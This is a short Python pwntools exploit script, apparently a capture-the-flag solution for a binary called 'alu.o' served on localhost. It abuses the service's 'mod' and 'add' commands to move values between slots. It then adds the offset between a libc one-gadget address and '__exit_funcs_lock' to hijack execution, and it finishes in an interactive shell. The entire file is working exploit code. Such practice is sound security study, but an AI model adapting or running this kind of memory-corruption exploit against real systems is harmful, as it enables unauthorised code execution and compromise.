from pwn import *
# from exploit import *

# p = process("./alu.o")
p = remote("localhost", 13500)

gadget = 0xe3b31
__exit_funcs_locktele = 0x1f12e8

conv = lambda c: chr(ord('a') + c)

def mov(f, t):
    p.sendlineafter(">", f"mod {t} 1")
    p.sendlineafter(">", f"add {t} {f}")

mov(conv(48), conv(42))
mov(conv(49), conv(43))
p.sendlineafter(">", f"add {conv(42)} {gadget - __exit_funcs_locktele}")
p.sendlineafter(">", "")

p.interactive()